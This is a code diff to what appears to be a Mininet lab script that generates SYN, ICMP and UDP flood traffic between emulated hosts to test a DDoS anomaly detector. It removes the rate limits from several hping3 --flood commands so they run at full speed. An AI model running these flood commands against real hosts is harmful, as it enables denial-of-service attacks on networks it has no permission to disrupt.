@@ -37,7 +37,7 @@ BASELINE_CONT_INTERVAL  = "1"     # ping -i 1  → 1 pps
 # Attack volume for single (finite) attacks.
 # 50,000 pkts at --flood = ~5-8 seconds of traffic — enough for IF to score
 # clearly above 0.75 and for the full Phase 1→2→3 pipeline to run visibly.
-ATTACK_PKT_COUNT = 50000
+ATTACK_PKT_COUNT = 5000   # Lowered from 50000 — 5k pkts at --flood takes ~2-3s in Mininet VM
 
 # 8/8 split: 8 attackers, 8 legit hosts
 # Attackers: h1,h3,h5,h7,h9,h11,h13,h15 (odd hosts)
@@ -257,7 +257,7 @@ def launch_syn_flood_sustained(net, attacker_name="h1", victim_name="h2"):
          f"{attacker_name}({attacker.IP()}) → {victim_name}({victim.IP()})\n")
     info("    → Use  py stop_all_attacks(net)  to stop.\n")
     attacker.cmd(
-        f"hping3 -S -p 80 --flood -i u500 {victim.IP()} > /dev/null 2>&1 &"
+        f"hping3 -S -p 80 --flood {victim.IP()} > /dev/null 2>&1 &"  # removed -i u500: max flood speed
     )
 
 
@@ -269,7 +269,7 @@ def launch_icmp_flood_sustained(net, attacker_name="h5", victim_name="h6"):
          f"{attacker_name}({attacker.IP()}) → {victim_name}({victim.IP()})\n")
     info("    → Use  py stop_all_attacks(net)  to stop.\n")
     attacker.cmd(
-        f"hping3 --icmp --flood -i u500 {victim.IP()} > /dev/null 2>&1 &"
+        f"hping3 --icmp --flood {victim.IP()} > /dev/null 2>&1 &"  # removed -i u500: max flood speed
     )
 
 
@@ -281,7 +281,7 @@ def launch_udp_flood_sustained(net, attacker_name="h9", victim_name="h10"):
          f"{attacker_name}({attacker.IP()}) → {victim_name}({victim.IP()})\n")
     info("    → Use  py stop_all_attacks(net)  to stop.\n")
     attacker.cmd(
-        f"hping3 --udp -p 53 --flood -i u500 {victim.IP()} > /dev/null 2>&1 &"
+        f"hping3 --udp -p 53 --flood {victim.IP()} > /dev/null 2>&1 &"  # removed -i u500: max flood speed
     )
 
 
@@ -296,9 +296,9 @@ def start_syn_flood_campaign(net):
     # h11: p8080,u800  (medium rate, alt-HTTP port)
     info("*** [CAMPAIGN] SYN Flood — 3 attackers, varied params, fixed IPs\n")
     _syn = [
-        ("h1",  "h2",  "hping3 -S -p 80   --flood -i u500  "),
-        ("h13", "h14", "hping3 -S -p 443  --flood -i u1000 "),
-        ("h11", "h12", "hping3 -S -p 8080 --flood -i u800  "),
+        ("h1",  "h2",  "hping3 -S -p 80   --flood  "),
+        ("h13", "h14", "hping3 -S -p 443  --flood "),
+        ("h11", "h12", "hping3 -S -p 8080 --flood  "),
     ]
     for att, vic, cmd in _syn:
         attacker = net.get(att)
@@ -313,8 +313,8 @@ def start_icmp_flood_campaign(net):
     # h3: slower rate with larger payload (u1000 --data 120) — bigger byte_count
     info("*** [CAMPAIGN] ICMP Flood — 2 attackers, varied params, fixed IPs\n")
     _icmp = [
-        ("h5", "h6", "hping3 --icmp --flood -i u500          "),
-        ("h3", "h4", "hping3 --icmp --flood -i u1000 --data 120 "),
+        ("h5", "h6", "hping3 --icmp --flood          "),
+        ("h3", "h4", "hping3 --icmp --flood --data 120 "),
     ]
     for att, vic, cmd in _icmp:
         attacker = net.get(att)
@@ -330,9 +330,9 @@ def start_udp_flood_campaign(net):
     # h15: p443, u800  (medium, HTTPS port)
     info("*** [CAMPAIGN] UDP Flood — 3 attackers, varied params, fixed IPs\n")
     _udp = [
-        ("h9",  "h10", "hping3 --udp -p 53  --flood -i u500  "),
-        ("h7",  "h8",  "hping3 --udp -p 80  --flood -i u1000 "),
-        ("h15", "h16", "hping3 --udp -p 443 --flood -i u800  "),
+        ("h9",  "h10", "hping3 --udp -p 53  --flood  "),
+        ("h7",  "h8",  "hping3 --udp -p 80  --flood "),
+        ("h15", "h16", "hping3 --udp -p 443 --flood  "),
     ]
     for att, vic, cmd in _udp:
         attacker = net.get(att)
@@ -351,16 +351,16 @@ def start_mixed_campaign(net):
     info("*** [CAMPAIGN] Mixed DDoS — SYN + ICMP + UDP simultaneously, fixed IPs\n")
     campaigns = [
         # SYN attackers — different ports + intervals → different pps + dst_port features
-        ("h1",  "h2",  "hping3 -S -p 80   --flood -i u500",   "SYN Flood"),
-        ("h13", "h14", "hping3 -S -p 443  --flood -i u1000",  "SYN Flood (p443)"),
-        ("h11", "h12", "hping3 -S -p 8080 --flood -i u800",   "SYN Flood (p8080)"),
+        ("h1",  "h2",  "hping3 -S -p 80   --flood",   "SYN Flood"),
+        ("h13", "h14", "hping3 -S -p 443  --flood",  "SYN Flood (p443)"),
+        ("h11", "h12", "hping3 -S -p 8080 --flood",   "SYN Flood (p8080)"),
         # ICMP attackers — different intervals + payload → different byte_count/pps
-        ("h5",  "h6",  "hping3 --icmp --flood -i u500",        "ICMP Flood"),
-        ("h3",  "h4",  "hping3 --icmp --flood -i u1000 --data 120", "ICMP Flood (large)"),
+        ("h5",  "h6",  "hping3 --icmp --flood",        "ICMP Flood"),
+        ("h3",  "h4",  "hping3 --icmp --flood --data 120", "ICMP Flood (large)"),
         # UDP attackers — different ports + intervals → different pps + dst_port features
-        ("h9",  "h10", "hping3 --udp -p 53  --flood -i u500",  "UDP Flood"),
-        ("h7",  "h8",  "hping3 --udp -p 80  --flood -i u1000", "UDP Flood (p80)"),
-        ("h15", "h16", "hping3 --udp -p 443 --flood -i u800",  "UDP Flood (p443)"),
+        ("h9",  "h10", "hping3 --udp -p 53  --flood",  "UDP Flood"),
+        ("h7",  "h8",  "hping3 --udp -p 80  --flood", "UDP Flood (p80)"),
+        ("h15", "h16", "hping3 --udp -p 443 --flood",  "UDP Flood (p443)"),
     ]
     for att, vic, cmd_prefix, label in campaigns:
         attacker = net.get(att)
